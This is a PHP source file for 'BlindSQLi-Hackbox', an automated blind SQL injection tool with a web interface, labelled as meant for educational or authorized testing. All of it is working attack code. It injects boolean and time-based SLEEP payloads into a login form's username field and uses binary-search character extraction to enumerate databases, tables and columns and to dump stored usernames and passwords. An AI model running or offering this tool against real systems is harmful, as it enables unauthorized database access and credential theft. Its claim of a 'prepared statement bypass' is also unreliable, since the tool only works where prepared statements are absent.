<?php
/*
╔══════════════════════════════════════════════════════════════╗
║        BlindSQLi-Hackbox (PHP/XAMPP Edition)                ║
║  Automated Blind SQL Injection Exploitation                  ║
║  For educational/authorized testing only                     ║
╚══════════════════════════════════════════════════════════════╝

Instructions:
1. Save this file as 'hackbox.php' in your XAMPP htdocs folder
2. Place it in the same directory as your target login.php (or adjust paths)
3. Access via: http://localhost/hackbox.php?target=login.php&action=tables
   or visit with no params for the web UI
*/

// ─── Configuration ─────────────────────────────────────────────────────

// Change these to match your target
$target_url = isset($_GET['target']) ? $_GET['target'] : 'login.php';
$injection_param_user = 'user';  // POST parameter for username
$injection_param_pass = 'pass';  // POST parameter for password

// Oracle detection settings
// If the login page shows "Invalid username or password" on failure
// and redirects/ shows "Welcome" on success
$true_condition = "Login";  // Present when TRUE (change if needed)
$false_condition = "Invalid";  // Present when FALSE (change if needed)

// Or use time-based if no visible difference
$use_time_based = isset($_GET['time']) ? true : false;
$sleep_time = 5; // seconds for time-based

$action = isset($_GET['action']) ? $_GET['action'] : 'menu';

// Database info (extracted automatically)
$db_name = isset($_GET['db']) ? $_GET['db'] : '';

// ─── Helper Functions ──────────────────────────────────────────────────

function send_request($user_val, $pass_val, $target) {
    $ch = curl_init($target);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'user' => $user_val,
        'pass' => $pass_val
    ]));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function boolean_oracle($condition, $target, $false_cond, $true_cond, $use_time, $sleep) {
    global $injection_param_user, $injection_param_pass;
    
    if ($use_time) {
        // Time-based: IF(condition, SLEEP(sleep), 0)
        $payload = "' OR IF(($condition), SLEEP($sleep), 0) AND '1'='1";
        $start = microtime(true);
        send_request($payload, 'anything', $target);
        $elapsed = microtime(true) - $start;
        return ($elapsed >= $sleep * 0.8);
    } else {
        // Boolean-based: check response for true/false strings
        $payload = "' OR $condition AND '1'='1";
        $response = send_request($payload, 'anything', $target);
        
        if ($true_cond) {
            return (strpos($response, $true_cond) !== false);
        }
        if ($false_cond) {
            return (strpos($response, $false_cond) === false);
        }
        // Fallback: check if response differs from a known-false condition
        $false_resp = send_request("' AND 1=2 AND '1'='1", 'anything', $target);
        return ($response !== $false_resp);
    }
}

function extract_char($sql_query, $position, $target, $false_cond, $true_cond, $use_time, $sleep) {
    // Binary search for ASCII value at position
    // Uses: ASCII(SUBSTRING(($sql_query), $position, 1)) > X
    
    $low = 32;
    $high = 126;
    
    while ($low <= $high) {
        $mid = intval(($low + $high) / 2);
        
        // Check if ASCII > mid
        $condition = "ASCII(SUBSTRING(($sql_query), $position, 1)) > $mid";
        $is_greater = boolean_oracle($condition, $target, $false_cond, $true_cond, $use_time, $sleep);
        
        if ($is_greater) {
            $low = $mid + 1;
        } else {
            // Check if ASCII == mid
            $condition_eq = "ASCII(SUBSTRING(($sql_query), $position, 1)) = $mid";
            $is_equal = boolean_oracle($condition_eq, $target, $false_cond, $true_cond, $use_time, $sleep);
            
            if ($is_equal) {
                return chr($mid);
            }
            $high = $mid - 1;
        }
        
        // Small delay to avoid overwhelming the server
        usleep(100000); // 0.1 second
    }
    
    return null;
}

function extract_string($sql_query, $max_length, $target, $false_cond, $true_cond, $use_time, $sleep) {
    $result = "";
    
    echo "<div style='font-family:monospace;color:#0f0;background:#111;padding:10px;border-radius:5px;'>";
    echo "[*] Extracting: <span id='result'>";
    ob_flush();
    flush();
    
    for ($i = 1; $i <= $max_length; $i++) {
        $ch = extract_char($sql_query, $i, $target, $false_cond, $true_cond, $use_time, $sleep);
        
        if ($ch === null || ord($ch) < 32) {
            break;
        }
        
        $result .= $ch;
        echo htmlspecialchars($ch);
        ob_flush();
        flush();
        
        // After 50 chars, likely an infinite loop — break
        if ($i >= $max_length - 1) {
            echo " [...]";
            break;
        }
    }
    
    echo "</span></div>";
    return $result;
}

function get_num_tables($target, $false_cond, $true_cond, $use_time, $sleep, $db) {
    $db_filter = $db ? "WHERE table_schema='$db'" : "WHERE table_schema=DATABASE()";
    
    for ($n = 1; $n <= 20; $n++) {
        $cond = "(SELECT COUNT(*) FROM information_schema.tables $db_filter) = $n";
        if (boolean_oracle($cond, $target, $false_cond, $true_cond, $use_time, $sleep)) {
            return $n;
        }
    }
    return 0;
}

function get_num_columns($table, $target, $false_cond, $true_cond, $use_time, $sleep, $db) {
    $db_filter = $db ? "table_schema='$db' AND " : "";
    
    for ($n = 1; $n <= 50; $n++) {
        $cond = "(SELECT COUNT(*) FROM information_schema.columns WHERE {$db_filter}table_name='$table') = $n";
        if (boolean_oracle($cond, $target, $false_cond, $true_cond, $use_time, $sleep)) {
            return $n;
        }
    }
    return 0;
}

function get_num_rows($table, $target, $false_cond, $true_cond, $use_time, $sleep) {
    for ($n = 1; $n <= 100; $n++) {
        $cond = "(SELECT COUNT(*) FROM $table) = $n";
        if (boolean_oracle($cond, $target, $false_cond, $true_cond, $use_time, $sleep)) {
            return $n;
        }
    }
    return 0;
}

// ─── Web UI ────────────────────────────────────────────────────────────

function render_menu() {
    global $target_url, $false_condition, $true_condition, $use_time_based;
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>BlindSQLi-Hackbox (PHP)</title>
        <style>
            body { background: #0a0a0a; color: #ccc; font-family: 'Courier New', monospace; margin: 20px; }
            h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
            h2 { color: #0f0; }
            .container { max-width: 900px; margin: 0 auto; }
            .box { background: #111; border: 1px solid #333; padding: 20px; margin: 15px 0; border-radius: 8px; }
            label { display: block; margin: 10px 0 5px; color: #0f0; }
            input, select { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; width: 100%; font-family: monospace; }
            input[type="submit"] { background: #0f0; color: #000; font-weight: bold; cursor: pointer; width: auto; padding: 10px 25px; margin-top: 15px; }
            input[type="submit"]:hover { background: #0c0; }
            .btn { display: inline-block; background: #333; color: #0f0; padding: 8px 15px; text-decoration: none; border-radius: 4px; margin: 5px; border: 1px solid #0f0; }
            .btn:hover { background: #0f0; color: #000; }
            .output { background: #111; color: #0f0; padding: 15px; border-radius: 5px; margin-top: 20px; border: 1px solid #333; }
            .note { color: #888; font-size: 0.9em; margin: 10px 0; }
            .warning { color: #ff0; }
            hr { border-color: #333; }
            table { width: 100%; border-collapse: collapse; }
            td, th { padding: 8px; border: 1px solid #333; text-align: left; }
            th { background: #222; color: #0f0; }
        </style>
    </head>
    <body>
    <div class="container">
        <h1>╔══ BlindSQLi-Hackbox (PHP/XAMPP) ══╗</h1>
        
        <div class="box">
            <h2>Configuration</h2>
            <form method="GET" action="hackbox.php">
                <label>Target URL (relative to this script):</label>
                <input type="text" name="target" value="<?php echo htmlspecialchars($target_url); ?>">
                
                <label><input type="checkbox" name="time" value="1" <?php echo $use_time_based ? 'checked' : ''; ?>> Use Time-Based (SLEEP)</label>
                
                <label>Database Name (optional, leave blank for auto-detect):</label>
                <input type="text" name="db" value="">
                
                <hr>
                <strong style="color:#0f0;">Quick Actions:</strong>
                <button type="submit" name="action" value="recon" class="btn" style="border:none;background:#0f0;color:#000;cursor:pointer;">1. Basic Recon (Version/DB/User)</button>
                <button type="submit" name="action" value="tables" class="btn" style="border:none;background:#0f0;color:#000;cursor:pointer;">2. Extract Tables</button>
                <button type="submit" name="action" value="check" class="btn" style="border:none;background:#ff0;color:#000;cursor:pointer;">3. Test Oracle</button>
            </form>
        </div>
        
        <div class="box">
            <h2>Manual Query</h2>
            <form method="GET" action="hackbox.php">
                <input type="hidden" name="target" value="<?php echo htmlspecialchars($target_url); ?>">
                <input type="hidden" name="db" value="">
                <label>Custom SQL (e.g., SELECT VERSION()):</label>
                <input type="text" name="query" value="SELECT VERSION()" placeholder="SELECT VERSION()">
                <button type="submit" name="action" value="query" style="background:#0f0;color:#000;border:none;padding:10px 25px;cursor:pointer;font-family:monospace;font-weight:bold;">Run Query</button>
            </form>
        </div>
        
        <div class="box">
            <h2>Column & Data Extraction</h2>
            <form method="GET" action="hackbox.php">
                <input type="hidden" name="target" value="<?php echo htmlspecialchars($target_url); ?>">
                <label>Table Name:</label>
                <input type="text" name="table" placeholder="e.g., tblusers" value="">
                <button type="submit" name="action" value="columns" style="background:#0f0;color:#000;border:none;padding:10px 25px;cursor:pointer;font-family:monospace;font-weight:bold;">Extract Columns</button>
            </form>
            <hr>
            <form method="GET" action="hackbox.php">
                <input type="hidden" name="target" value="<?php echo htmlspecialchars($target_url); ?>">
                <label>Dump Data From Table:</label>
                <input type="text" name="table" placeholder="tblusers" value="">
                <label>Columns (comma-separated):</label>
                <input type="text" name="cols" placeholder="user,pass" value="user,pass">
                <button type="submit" name="action" value="dump" style="background:#0f0;color:#000;border:none;padding:10px 25px;cursor:pointer;font-family:monospace;font-weight:bold;">Dump Data</button>
            </form>
        </div>
        
        <div class="note">
            <p><strong>How it works:</strong> Injects SQL conditions into the username field using prepared statement bypass techniques.<br>
            The login page's response (success vs failure) acts as the boolean oracle.<br>
            Binary search extracts data ~7 requests per character instead of ~95.</p>
            <p class="warning">⚠ This runs against: <strong><?php echo htmlspecialchars($target_url); ?></strong></p>
        </div>
    </div>
    </body>
    </html>
    <?php
}

// ─── Action Router ─────────────────────────────────────────────────────

if ($action === 'menu' || !isset($_GET['action'])) {
    render_menu();
    exit;
}

// Everything below uses the terminal-style output
echo "<!DOCTYPE html><html><head><title>BlindSQLi Output</title><style>
    body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
    .output { background: #111; padding: 20px; border-radius: 8px; border: 1px solid #333; }
    a { color: #0f0; }
    .note { color: #888; }
</style></head><body><div class='output'>";

echo "<h2>⚡ BlindSQLi-Hackbox Output</h2>";
echo "<p class='note'>Target: " . htmlspecialchars($target_url) . " | DB: " . ($db_name ?: 'auto-detect') . "</p>";
echo "<hr>";

// Test the oracle first
if ($action === 'check') {
    echo "<h3>Oracle Test</h3>";
    
    echo "<p>Testing TRUE condition (1=1)...</p>";
    $true_resp = send_request("' OR 1=1 AND '1'='1", 'anything', $target_url);
    $true_check = strpos($true_resp, $true_condition) !== false;
    echo "<p>Response contains '$true_condition': " . ($true_check ? 'YES ✓' : 'NO ✗') . "</p>";
    
    echo "<p>Testing FALSE condition (1=2)...</p>";
    $false_resp = send_request("' OR 1=2 AND '1'='1", 'anything', $target_url);
    $false_check = strpos($false_resp, $false_condition) !== false;
    echo "<p>Response contains '$false_condition': " . ($false_check ? 'YES ✓' : 'NO ✗') . "</p>";
    
    if ($true_check !== $false_check) {
        echo "<p style='color:#0f0;font-weight:bold;'>✓ Oracle working! Boolean-based injection confirmed.</p>";
    } elseif ($use_time_based) {
        echo "<p style='color:#ff0;'>Timing test recommended. Try time-based mode.</p>";
    } else {
        echo "<p style='color:#ff0;'>Warning: Oracle may not be reliable. Try time-based (?time=1)</p>";
    }
    
    echo "<p><a href='?target=" . urlencode($target_url) . "'>← Back to menu</a></p>";
}

// Recon mode
if ($action === 'recon') {
    echo "<h3>⟐ Stage 1: Database Reconnaissance</h3>";
    
    echo "<p>▶ Extracting MySQL version...</p>";
    $version = extract_string("SELECT VERSION()", 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
    echo "<p><strong>MySQL Version:</strong> " . htmlspecialchars($version) . "</p>";
    
    echo "<p>▶ Extracting current database...</p>";
    $db = extract_string("SELECT DATABASE()", 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
    echo "<p><strong>Current Database:</strong> " . htmlspecialchars($db) . "</p>";
    $_GET['db'] = $db;
    $db_name = $db;
    
    echo "<p>▶ Extracting database user...</p>";
    $user = extract_string("SELECT CURRENT_USER()", 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
    echo "<p><strong>Database User:</strong> " . htmlspecialchars($user) . "</p>";
    
    echo "<hr><p><a href='?target=" . urlencode($target_url) . "&db=" . urlencode($db_name) . "&action=tables'>Next: Extract Tables →</a></p>";
}

// Tables extraction
if ($action === 'tables') {
    echo "<h3>⟐ Stage 2: Table Enumeration</h3>";
    
    // First get database name if not provided
    if (!$db_name) {
        echo "<p>▶ Determining database name...</p>";
        $db_name = extract_string("SELECT DATABASE()", 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
        echo "<p><strong>Database:</strong> " . htmlspecialchars($db_name) . "</p>";
    }
    
    echo "<p>▶ Counting tables...</p>";
    $num_tables = get_num_tables($target_url, $false_condition, $true_condition, $use_time_based, $sleep_time, $db_name);
    echo "<p><strong>Number of tables:</strong> " . $num_tables . "</p>";
    
    echo "<table><tr><th>#</th><th>Table Name</th></tr>";
    for ($t = 0; $t < $num_tables; $t++) {
        $sql = "SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT $t,1";
        echo "<tr><td>$t</td><td>";
        $tname = extract_string($sql, 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
        echo " " . htmlspecialchars($tname) . "</td></tr>";
    }
    echo "</table>";
    
    echo "<hr><p><a href='?target=" . urlencode($target_url) . "&db=" . urlencode($db_name) . "'>← Back to menu (use DB: $db_name)</a></p>";
}

// Columns extraction
if (isset($_GET['table']) && $action === 'columns') {
    $table = $_GET['table'];
    echo "<h3>⟐ Stage 3: Column Enumeration for `$table`</h3>";
    
    if (!$db_name) {
        $db_name = extract_string("SELECT DATABASE()", 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
    }
    
    $num_cols = get_num_columns($table, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time, $db_name);
    echo "<p><strong>Number of columns:</strong> " . $num_cols . "</p>";
    
    echo "<table><tr><th>#</th><th>Column Name</th></tr>";
    for ($c = 0; $c < $num_cols; $c++) {
        $db_filter = $db_name ? "table_schema='$db_name' AND " : "";
        $sql = "SELECT column_name FROM information_schema.columns WHERE {$db_filter}table_name='$table' LIMIT $c,1";
        echo "<tr><td>$c</td><td>";
        $cname = extract_string($sql, 30, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
        echo " " . htmlspecialchars($cname) . "</td></tr>";
    }
    echo "</table>";
    
    echo "<hr><p><a href='?target=" . urlencode($target_url) . "&db=" . urlencode($db_name) . "&table=" . urlencode($table) . "'>← Back</a></p>";
}

// Dump data
if (isset($_GET['table']) && isset($_GET['cols']) && $action === 'dump') {
    $table = $_GET['table'];
    $columns = explode(',', $_GET['cols']);
    
    echo "<h3>⟐ Stage 4: Data Extraction from `$table`</h3>";
    echo "<p>Columns: " . htmlspecialchars(implode(', ', $columns)) . "</p>";
    
    $num_rows = get_num_rows($table, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
    echo "<p><strong>Number of rows:</strong> " . $num_rows . "</p>";
    
    echo "<table><tr><th>#</th>";
    foreach ($columns as $col) {
        echo "<th>" . htmlspecialchars(trim($col)) . "</th>";
    }
    echo "</tr>";
    
    for ($row = 0; $row < min($num_rows, 10); $row++) {
        echo "<tr><td>$row</td>";
        foreach ($columns as $col) {
            $col = trim($col);
            $sql = "SELECT $col FROM $table LIMIT $row,1";
            echo "<td>";
            $val = extract_string($sql, 40, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
            echo htmlspecialchars($val) . "</td>";
        }
        echo "</tr>";
    }
    echo "</table>";
    
    echo "<p class='note'>Showing first " . min($num_rows, 10) . " of $num_rows rows</p>";
}

// Custom query
if ($action === 'query' && isset($_GET['query'])) {
    $sql_query = $_GET['query'];
    echo "<h3>⟐ Custom Query</h3>";
    echo "<p>SQL: <code>" . htmlspecialchars($sql_query) . "</code></p>";
    $result = extract_string($sql_query, 64, $target_url, $false_condition, $true_condition, $use_time_based, $sleep_time);
    echo "<p><strong>Result:</strong> " . htmlspecialchars($result) . "</p>";
}

echo "<hr><p><a href='hackbox.php?target=" . urlencode($target_url) . "'>← Back to Hackbox Menu</a></p>";
echo "</div></body></html>";
?>